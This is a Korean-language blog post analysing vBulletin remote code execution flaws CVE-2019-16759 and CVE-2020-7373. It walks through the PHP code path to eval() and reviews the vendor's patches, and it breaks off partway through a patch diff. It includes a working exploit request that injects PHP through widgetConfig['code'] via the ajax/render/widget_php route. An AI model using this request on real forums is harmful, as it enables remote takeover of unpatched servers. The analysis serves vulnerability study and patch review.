        <content type="html"><![CDATA[<p><strong>vBulletin에서 발견된 0-day 취약점을 분석해보겠습니다. vBulletin은 외국에서 사용하는 포럼 툴이라고 합니다. 한국 말로 풀어 쓰면 토론형 게시판이라고 볼 수 있겠습니다. 여하튼 이 포럼 툴에서 RCE 취약점이 총 2번 발견 되었습니다. </strong><br><br></p><table><thead><tr><th>CVE ID</th><th>Version</th><th>CVSS</th></tr></thead><tbody><tr><td>CVE-2019-16759</td><td>5.x ~ 5.5.4</td><td>9.8</td></tr><tr><td>CVE-2020-7373</td><td>5.5.4 ~ 5.6.2</td><td>9.8</td></tr></tbody></table><p><br><strong>처음에는 <code>CVE-2019-16759</code>라는 취약점이 나왔었고, 취약한 버전은 5.x부터 5.5.4까지라고 합니다. 해당 취약점은 9월 24일에 처음 POC가 공개되었고, 바로 다음 날인 25일에 패치가 됐다고 합니다.<strong><br></p><p><strong>하지만 완전히 패치된 줄 알았던 0-day 취약점이 한 보안 연구원에 의해서 또 다시 뚫리고 말았습니다. <code>CVE-2020-7373</code>라는 CVE ID로 나왔었고, 취약한 버전은 5.5.4부터 5.6.2까지라고 합니다. 그럼 한 번 RCE가 어떻게 트리거 됐는지 코드 분석을 통해 알아보겠습니다.</strong><br><br></p><hr><h2 id="CVE-2019-16759"><a href="#CVE-2019-16759" class="headerlink" title="CVE-2019-16759"></a><em>CVE-2019-16759</em></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="comment">//For a few set routes we can run a streamlined funcction.</span></span><br><span class="line"><span class="keyword">if</span> (vB5_Frontend_ApplicationLight::isQuickRoute())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$app</span> = vB5_Frontend_ApplicationLight::init(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$app</span>-&gt;execute())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure><p><strong>취약점의 시작은 index.php에서 시작이 됩니다. <code>isQuickRoute()</code>의 값이 참이면 if 문 내부로 들어가는 것을 볼 수 있습니다. isQuickRoute 메서드는 <code>includes/vb5/frontend/applicationlight.php</code> 내부에 정의되어 있습니다.</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// includes/vb5/frontend/applicationlight.php</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** Tells whether this class can process this request</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> boll</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">isQuickRoute</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="built_in">self</span>::<span class="variable">$quickRoutes</span>[<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>]]))</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (substr(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>], <span class="number">0</span>, <span class="number">8</span>) == <span class="string">&#x27;ajax/api&#x27;</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (substr(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>], <span class="number">0</span>, <span class="number">11</span>) == <span class="string">&#x27;ajax/render&#x27;</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong><code>includes/vb5/frontend/applicationlight.php</code> 내부에는 위와 같이 isQuickRoute 메서드가 정의되어 있는데 routestring의 값이 <code>&#39;ajax/api&#39;</code>, <code>&#39;ajax/render&#39;</code>이면 ture를 반환해 vB5_Frontend_ApplicationLight::init가 실행이 됩니다.</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// includes/vb5/frontend/applicationlight.php</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**Standard constructor. We only access application throuth init() **/</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring]))</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            return false;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        if (isset(self::$quickRoutes[$_REQUEST[&#x27;</span>routestring<span class="string">&#x27;]]))</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            $this-&gt;application = self::$quickRoutes[$_REQUEST[&#x27;</span>routestring]];</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (substr(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring], 0, 8) == &#x27;</span>ajax/api<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            $this-&gt;application = array(&#x27;</span>handler<span class="string">&#x27; =&gt; &#x27;</span>handleAjaxApi<span class="string">&#x27;, &#x27;</span><span class="built_in">static</span><span class="string">&#x27; =&gt; false);</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            if (substr($_REQUEST[&#x27;</span>routestring<span class="string">&#x27;], 0, 17) == &#x27;</span>ajax/api/cron/run<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">            &#123;</span></span><br><span class="line"><span class="string">                $this-&gt;application[&#x27;</span>runcron<span class="string">&#x27;] = true;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            return true;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        if (substr($_REQUEST[&#x27;</span>routestring<span class="string">&#x27;], 0, 11) == &#x27;</span>ajax/render<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            $this-&gt;application = array(&#x27;</span>handler<span class="string">&#x27; =&gt; &#x27;</span>callRender<span class="string">&#x27;, &#x27;</span><span class="built_in">static</span><span class="string">&#x27; =&gt; false);</span></span><br><span class="line"><span class="string">            return true;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        return false;  </span></span><br><span class="line"><span class="string">    &#125;    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(생략)</span></span><br></pre></td></tr></table></figure><p><strong>index.php에서 vB5_Frontend_ApplicationLight::init 메서드가 실행되면 위 __construct 메서드가 실행됩니다. 코드 하단에 보면 <code>routestring</code>의 값이 <code>&#39;ajax/render&#39;</code>이면 handler로 callRender 메서드가 설정되어 있는 것을 볼 수 있습니다. callRender 메서드도 <code>includes/vb5/frontend/applicationlight.php</code> 내부에 정의되어 있습니다.</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// includes/vb5/frontend/applicationlight.php</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** This renders a template from an ajax call</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">callRender</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$routeInfo</span> = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>]);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (count(<span class="variable">$routeInfo</span>) &lt; <span class="number">3</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> vB5_Exception_Api(<span class="string">&#x27;ajax&#x27;</span>, <span class="string">&#x27;api&#x27;</span>, <span class="keyword">array</span>(), <span class="string">&#x27;invalid_request&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$params</span> = array_merge(<span class="variable">$_POST</span>, <span class="variable">$_GET</span>);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;router = <span class="keyword">new</span> vB5_Frontend_Routing();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;router-&gt;setRouteInfo(<span class="keyword">array</span>(<span class="string">&#x27;action&#x27;</span> =&gt; <span class="string">&#x27;actionRender&#x27;</span>, <span class="string">&#x27;arguments&#x27;</span> =&gt; <span class="variable">$params</span>,</span><br><span class="line">            <span class="string">&#x27;template&#x27;</span> =&gt; <span class="variable">$routeInfo</span>[<span class="number">2</span>], <span class="string">&#x27;queryParameters&#x27;</span> =&gt; <span class="variable">$_GET</span>));</span><br><span class="line">        Api_InterfaceAbstract::setLight();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sendAsJson(vB5_Template::staticRenderAjax(<span class="variable">$routeInfo</span>[<span class="number">2</span>], <span class="variable">$params</span>));</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure><p><strong>callRender 메서드를 보면 $routeInfo에 explode() 메서드를 이용해서 <code>$_REQUEST[&#39;routestring&#39;]</code>의 값을 슬래쉬를 기준으로 잘라 배열로 만들어주고, $params에는 array_merge 메서드를 이용해서 Query String 값과 Raw Data 값을 합쳐 하나의 배열로 만드는 것을 볼 수 있습니다.</strong><br></p><p><strong>그리고 $routeInfo[2]의 값과 $params의 값을 템플릿으로 전송하는 것을 볼 수 있습니다.</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// core/install/vbulletin-style.xml</span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">template</span> <span class="attr">name</span>=<span class="string">&quot;widget_php&quot;</span> <span class="attr">templatetype</span>=<span class="string">&quot;template&quot;</span> <span class="attr">date</span>=<span class="string">&quot;1372889589&quot;</span> <span class="attr">username</span>=<span class="string">&quot;vBulletin Solutions&quot;</span> <span class="attr">version</span>=<span class="string">&quot;5.0.5 Release Canddate 1&quot;</span>&gt;</span>&lt;![CDATA[&lt;</span><br><span class="line">        vb:if condition=&quot;empty(widgetConfig) AND !empty($widgetinstaceid)&quot;&gt;</span><br><span class="line">    &#123;vb:data widgetConfig, widget, fetchConfig, (vb:raw widgetinstanceid)&#125;</span><br><span class="line">&lt;/vb:if&gt;</span><br><span class="line">&lt;vb:if condition=&quot;!empty($widgetConfig)&quot;&gt;</span><br><span class="line">    &#123;vb:set widgetid, &#123;vb:raw widgetConfig.widgetid&#125;&#125;</span><br><span class="line">    &#123;vb:set widgetinstanceid, &#123;vb:raw widgetConfig.widgetinstanceid&#125;&#125;</span><br><span class="line">&lt;/vb:if&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;canvax-widget default-widget custtom-html-widget&quot; data-widget-id=&quot;&#123;vb:raw widgetid&#125;&quot; data-widget-instance-id=&quot;&#123;vb:raw widgetinstanceid&#125;&quot;&gt;</span><br><span class="line">    &#123;vb:template module_title, widgetConfig=&#123;vb:raw widgetConfig&#125;, can_use_sitebuilder=&#123;vb:raw user.can_use_sitebuilder&#125;&#125;</span><br><span class="line">    &lt;div class=&quot;widget-header-divder&quot; /&gt;</span><br><span class="line">        &lt;hr class=&quot;widget-header-divider&quot; /&gt;</span><br><span class="line">        &lt;vb:if condition=&quot;!empty($widgetConfig[&#x27;code&#x27;]) AND !$vboptions[&#x27;disable_php_rendering&#x27;]&quot;&gt;</span><br><span class="line">            &#123;vb:action evaledPHP, bbcode, evalCode, &#123;vb:raw widgetConfig.code&#125;&#125;</span><br><span class="line">            &#123;vb:raw $evaledPHP&#125;</span><br><span class="line">        &lt;vb:else /&gt;</span><br><span class="line">            &lt;vb:if condition=&quot;$user[can_use_sitebuilder&#x27;]&quot;&gt;</span><br><span class="line">                &lt;span class=&quot;note&quot;&gt;&#123;vb:phrase click_edit_to_config_module&#125;&lt;/span&gt;</span><br><span class="line">            &lt;/vb:if&gt;</span><br><span class="line">        &lt;/vb:if&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;div&gt;]]&gt;<span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure><p><strong>widget_php 템플릿을 확인해보면 <code>$widgetConfig[&#39;code&#39;]</code>의 값이 비어있지 않고, <code>!$vboptions[&#39;disable_php_rendering&#39;]</code>가 비활성화 되어 있으면 다음 코드를 코드를 실행하는 것을 볼 수 있습니다.</strong><br></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;vb:action evaledPHP, bbcode, evalCode, &#123;vb:raw widgetConfig.code&#125;&#125;</span><br><span class="line">&#123;vb:raw $evaledPHP&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// includes/vb5/frontend/controller/bbcode.php</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">evalCode</span>(<span class="params"><span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">        <span class="variable">$output</span> = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure><p><strong>evalCode 메서드는 <code>includes/vb5/frontend/controller/bbcode.php</code> 내에 정의하고 있고, eval 함수를 이용해서 $code 값을 실행시키고, <code>$output</code> 값을 리턴해주는 것을 볼 수 있습니다.</strong><br><br></p><p><strong>결론적으로 RCE를 트리거 하기 위해서는 <code>includes/vb5/frontend/applicationlight.php</code>에서 <code>isQuickRoute</code> 메서드에서 rotuestring의 값이 ‘ajax/render’여야 하고, callRender에서 $routeInfo[2]의 값은 <code>&#39;widget_php&#39;</code>여야 하고, <code>widget_php</code> 템플릿에서는 <code>$widgetConfig[&#39;code&#39;]</code>의 값이 존재해야 하고, eval 함수의 인자 값으로도 <code>$widgetConfig[&#39;code&#39;]</code>가 들어갑니다.</strong><br><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$routeInfo</span> = explode(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>]);</span><br><span class="line"><span class="variable">$params</span> = array_merge(<span class="variable">$_POST</span>, <span class="variable">$_GET</span>);</span><br><span class="line">print_r(<span class="variable">$routeInfo</span>);</span><br><span class="line">print_r(<span class="variable">$params</span>);</span><br><span class="line"></span><br><span class="line">input  : http:<span class="comment">//141.164.52.207/?routestring=ajax/render/widget_php&amp;widgetConfig[&#x27;code&#x27;]=phpinfo();</span></span><br><span class="line">output : <span class="keyword">Array</span> ( [<span class="number">0</span>] =&gt; ajax [<span class="number">1</span>] =&gt; render [<span class="number">2</span>] =&gt; widget_php ) <span class="keyword">Array</span> ( [routestring] =&gt; ajax/render/widget_php [widgetConfig] =&gt; <span class="keyword">Array</span> ( [<span class="string">&#x27;code&#x27;</span>] =&gt; phpinfo(); ) )</span><br></pre></td></tr></table></figure><p><strong>그리고 사용자 값을 받을 때, $_REQUEST를 이용해서 받아 오기 때문에 GET, POST 메서드를 이용해서 공격을 수행할 수 있습니다. 그러니 GET으로 익스를 하려면 위와 같이 그냥 값을 넘겨 주게 되면 substr($_REQUEST[‘routestring’], 0, 11)의 값이 <code>&#39;ajax/render&#39;</code>이기 때문에 참이 반환되는 동시에 vB5_Frontend_ApplicationLight::init가 실행 돼 __construct 메서드가 실행이 될 것이고, __construct 메서드에서도 substr($_REQUEST[‘routestring’], 0, 11)의 값이 <code>&#39;ajax/render&#39;</code>이기 때문에 handler를 callRender로 설정하게 됩니다. callRender 메서드에서는 routeInfo[2]의 값으로는 <code>&#39;widget_php&#39;</code>, widgetConfig[‘code’]의 값으로는 <code>&#39;phpinfo();&#39;</code>가 들어가 있어 2개의  widget_php 템플릿으로 전송이 됩니다. widget_php에서는 widgetConfig[‘code’]가 비어있지 않기 때문에 evalCode로 widgetConfig[‘code’]가 전송이 되어 phpinfo(); 함수가 실행이 되며 RCE가 성공적으로 트리거 되게 됩니다.</strong><br><br></p><hr><h2 id="CVE-2019-16759-Patch"><a href="#CVE-2019-16759-Patch" class="headerlink" title="CVE-2019-16759 Patch"></a><em>CVE-2019-16759 Patch</em></h2><p><strong>CVE-2019-16759 취약점은 총 2개의 패치가 이루어졌다고 합니다.</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *      Remove any problematic values from the template</span></span><br><span class="line"><span class="comment"> *      variable arrays before rendering</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//for now don&#x27;t pass the values through.  These arrays are potentially large</span></span><br><span class="line"><span class="comment">//and we don&#x27;t want to make unnecesary copies.  The alternative is to pass by</span></span><br><span class="line"><span class="comment">//reference which causes it&#x27;s own headaches.  It&#x27;s an internal function and the</span></span><br><span class="line"><span class="comment">//relevant arrays are all class variables.</span></span><br><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">cleanRegistered</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">        <span class="variable">$disallowedNames</span> = <span class="keyword">array</span>(<span class="string">&#x27;widgetConfig&#x27;</span>);</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$disallowedNames</span> <span class="keyword">AS</span> <span class="variable">$name</span>)</span><br><span class="line">        &#123;   </span><br><span class="line">                <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;registered[<span class="variable">$name</span>]);</span><br><span class="line">                <span class="keyword">unset</span>(<span class="built_in">self</span>::<span class="variable">$globalRegistered</span>[<span class="variable">$name</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>첫  패치는 <code>clearRegistered</code>라는 함수를 이용해서 widgetConfig라는 값이 사용되면 <code>unset()</code> 함수를 이용해서 제거하고 있습니다. 그러니 Query String 이나 Raw Data로 <code>widgetConfig[&#39;code&#39;]=phpinfo();</code>라는 값이 들어오게 되면 widgetConfig가 존재하기 때문에 <code>unset()</code>에 의해서 제거가 될 것 입니다.</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">diff -ur vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.4</span>_Patch_Level_2/upload/includes/vb5/frontend/applicationlight.php vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.5</span>/upload/includes/vb5/frontend/applicationlight.php</span><br><span class="line">--- vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.4</span>_Patch_Level_2/upload/includes/vb5/frontend/applicationlight.php<span class="number">2020</span><span class="number">-08</span><span class="number">-08</span> <span class="number">06</span>:<span class="number">40</span>:<span class="number">31.356918994</span> <span class="number">-0500</span></span><br><span class="line">+++ vBulletin/vBulletin/vb5_connect/vBulletin<span class="number">-5.5</span><span class="number">.5</span>/upload/includes/vb5/frontend/applicationlight.php<span class="number">2020</span><span class="number">-08</span><span class="number">-08</span> <span class="number">06</span>:<span class="number">40</span>:<span class="number">40.577517014</span> <span class="number">-0500</span></span><br><span class="line">@@ <span class="number">-286</span>,<span class="number">20</span> +<span class="number">286</span>,<span class="number">32</span> @@</span><br><span class="line"> <span class="keyword">throw</span> <span class="keyword">new</span> vB5_Exception_Api(<span class="string">&#x27;ajax&#x27;</span>, <span class="string">&#x27;render&#x27;</span>, <span class="keyword">array</span>(), <span class="string">&#x27;invalid_request&#x27;</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">-<span class="keyword">$this</span>-&gt;router = <span class="keyword">new</span> vB5_Frontend_Routing();</span><br><span class="line">-<span class="keyword">$this</span>-&gt;router-&gt;setRouteInfo(<span class="keyword">array</span>(</span><br><span class="line">-<span class="string">&#x27;action&#x27;</span>          =&gt; <span class="string">&#x27;actionRender&#x27;</span>,</span><br><span class="line">-<span class="string">&#x27;arguments&#x27;</span>       =&gt; <span class="variable">$serverData</span>,</span><br><span class="line">-<span class="string">&#x27;template&#x27;</span>        =&gt; <span class="variable">$routeInfo</span>[<span class="number">2</span>],</span><br><span class="line">-<span class="comment">// this use of $_GET appears to be fine,</span></span><br><span class="line">-<span class="comment">// since it&#x27;s setting the route query params</span></span><br><span class="line">-<span class="comment">// not sending the data to the template</span></span><br><span class="line">-<span class="comment">// render</span></span><br><span class="line">-<span class="string">&#x27;queryParameters&#x27;</span> =&gt; <span class="variable">$_GET</span>,</span><br><span class="line">-));</span><br><span class="line">-Api_InterfaceAbstract::setLight();</span><br><span class="line">+<span class="variable">$templateName</span> = <span class="variable">$routeInfo</span>[<span class="number">2</span>];</span><br><span class="line">+<span class="keyword">if</span> (<span class="variable">$templateName</span> == <span class="string">&#x27;widget_php&#x27;</span>)</span><br><span class="line">+&#123;</span><br><span class="line">+<span class="variable">$result</span> = <span class="keyword">array</span>(</span><br><span class="line">+<span class="string">&#x27;template&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">+<span class="string">&#x27;css_links&#x27;</span> =&gt; <span class="keyword">array</span>(),</span><br><span class="line">+);</span><br><span class="line">+&#125;</span><br><span class="line">+<span class="keyword">else</span></span><br><span class="line">+&#123;</span><br><span class="line">+<span class="keyword">$this</span>-&gt;router = <span class="keyword">new</span> vB5_Frontend_Routing();</span><br><span class="line">+<span class="keyword">$this</span>-&gt;router-&gt;setRouteInfo(<span class="keyword">array</span>(</span><br><span class="line">+<span class="string">&#x27;action&#x27;</span>          =&gt; <span class="string">&#x27;actionRender&#x27;</span>,</span><br><span class="line">+<span class="string">&#x27;arguments&#x27;</span>       =&gt; <span class="variable">$serverData</span>,</span><br><span class="line">+<span class="string">&#x27;template&#x27;</span>        =&gt; <span class="variable">$templateName</span>,</span><br><span class="line">+<span class="comment">// this use of $_GET appears to be fine,</span></span><br><span class="line">+<span class="comment">// since it&#x27;s setting the route query params</span></span><br><span class="line">+<span class="comment">// not sending the data to the template</span></span><br><span class="line">+<span class="comment">// render</span></span><br><span class="line">+<span class="string">&#x27;queryParameters&#x27;</span> =&gt; <span class="variable">$_GET</span>,</span><br><span class="line">+));</span><br><span class="line">+Api_InterfaceAbstract::setLight();</span><br><span class="line">+<span class="variable">$result</span> = vB5_Template::staticRenderAjax(<span class="variable">$templateName</span>, <span class="variable">$serverData</span>);</span><br><span class="line">+&#125;</span><br><span class="line"> 